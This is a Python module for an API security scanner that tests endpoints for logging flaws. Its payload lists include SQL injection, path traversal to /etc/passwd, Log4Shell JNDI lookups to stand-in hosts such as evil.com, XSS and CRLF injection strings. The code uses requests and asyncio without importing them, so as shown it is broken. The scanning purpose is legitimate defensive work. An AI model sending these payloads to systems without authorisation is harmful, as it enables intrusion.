#!/usr/bin/env python3
import aiohttp
from typing import Dict, List, Optional
from urllib.parse import urljoin
import json
import re
from RAGScripts.utils.logger import setup_scanner_logger

async def check_logging_security(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        initial_headers = dict(initial_response.headers)
        
        async with aiohttp.ClientSession() as session:
            # Test error disclosure
            error_results = await test_error_disclosure(session, test_url, method, initial_headers)
            findings.extend(error_results)
            
            # Test sensitive data logging
            sensitive_results = await test_sensitive_data_logging(session, test_url, method, initial_headers)
            findings.extend(sensitive_results)
            
            # Test log injection
            injection_results = await test_log_injection(session, test_url, method, initial_headers)
            findings.extend(injection_results)
            
            # Test logging configuration
            config_results = await test_logging_config(session, test_url, method, initial_headers)
            findings.extend(config_results)
    
    except Exception as e:
        print(f"Error in logging security check: {str(e)}")
    
    return findings

async def test_error_disclosure(session: aiohttp.ClientSession, url: str, method: str, headers: Dict) -> List[Dict]:
    findings = []
    error_triggers = [
        "' OR '1'='1",
        "undefined",
        "null",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/x}",
        "{{7*7}}"
    ]
    
    for trigger in error_triggers:
        try:
            test_headers = headers.copy()
            test_headers['X-Test-Error'] = trigger
            
            async with session.request(method, url, headers=test_headers, timeout=5) as response:
                response_text = await response.text()
                if await check_error_patterns(response_text):
                    findings.append({
                        "type": "API7:2023",
                        "name": "Improper Error Handling",
                        "detail": "Detailed error messages exposed",
                        "evidence": {
                            "url": url,
                            "trigger": trigger,
                            "response_snippet": response_text[:200]
                        },
                        "severity": "MEDIUM"
                    })
        except:
            continue
    
    return findings

async def test_sensitive_data_logging(session: aiohttp.ClientSession, url: str, method: str, headers: Dict) -> List[Dict]:
    findings = []
    sensitive_data = [
        {"password": "test123"},
        {"credit_card": "4111111111111111"},
        {"ssn": "123-45-6789"},
        {"api_key": "sk_test_123456789"},
        {"token": "eyJ0eXAiOiJKV1QiLCJhbGc"}
    ]
    
    for data in sensitive_data:
        try:
            async with session.request(method, url, json=data, headers=headers, timeout=5) as response:
                response_text = await response.text()
                if any(str(v) in response_text for v in data.values()):
                    findings.append({
                        "type": "API7:2023",
                        "name": "Sensitive Data Exposure",
                        "detail": "Sensitive data potentially logged",
                        "evidence": {
                            "url": url,
                            "data_type": list(data.keys())[0],
                            "found_in_response": True
                        },
                        "severity": "HIGH"
                    })
        except:
            continue
    
    return findings

async def test_log_injection(session: aiohttp.ClientSession, url: str, method: str, headers: Dict) -> List[Dict]:
    findings = []
    injection_payloads = [
        "%0A%0DUser-agent: *%0A%0DDisallow: /",
        "<?xml version='1.0'?><script>alert(1)</script>",
        "'; DROP TABLE users--",
        "${jndi:ldap://attacker.com/exploit}",
        "%0d%0aContent-Length:50%0d%0a%0d%0aScript"
    ]
    
    for payload in injection_payloads:
        try:
            test_headers = headers.copy()
            test_headers['User-Agent'] = payload
            
            async with session.request(method, url, headers=test_headers, timeout=5) as response:
                if response.status != 400:  # Should reject malformed input
                    findings.append({
                        "type": "API7:2023",
                        "name": "Log Injection",
                        "detail": "Potential log injection vulnerability",
                        "evidence": {
                            "url": url,
                            "payload": payload,
                            "response_code": response.status
                        },
                        "severity": "HIGH"
                    })
        except:
            continue
    
    return findings

async def test_logging_config(session: aiohttp.ClientSession, url: str, method: str, headers: Dict) -> List[Dict]:
    findings = []
    config_paths = [
        '/log',
        '/logs',
        '/debug/logs',
        '/api/logs',
        '/admin/logs',
        '/system/logs',
        '/logging'
    ]
    
    base_url = '/'.join(url.split('/')[:3])
    
    for path in config_paths:
        try:
            test_url = urljoin(base_url, path)
            async with session.request('GET', test_url, headers=headers, timeout=5) as response:
                if response.status != 404:
                    findings.append({
                        "type": "API7:2023",
                        "name": "Exposed Logs",
                        "detail": "Log files or configurations exposed",
                        "evidence": {
                            "url": test_url,
                            "status_code": response.status,
                            "response_length": len(await response.text())
                        },
                        "severity": "CRITICAL"
                    })
        except:
            continue
    
    return findings

async def check_error_patterns(response_text: str) -> bool:
    error_patterns = [
        r"Exception in thread",
        r"Stack trace:",
        r"at \w+\.\w+\(\w+\.java:\d+\)",
        r"File \".*\.py\".*line \d+",
        r"Warning: .*? in .*? on line \d+",
        r"MySQL Error",
        r"SQLSTATE\[",
        r"\.js:\d+:\d+"
    ]
    
    return any(re.search(pattern, response_text) for pattern in error_patterns)

if __name__ == "__main__":
    async def test():
        result = await check_logging_security(
            "http://localhost:5000",
            "/api/data",
            "GET",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())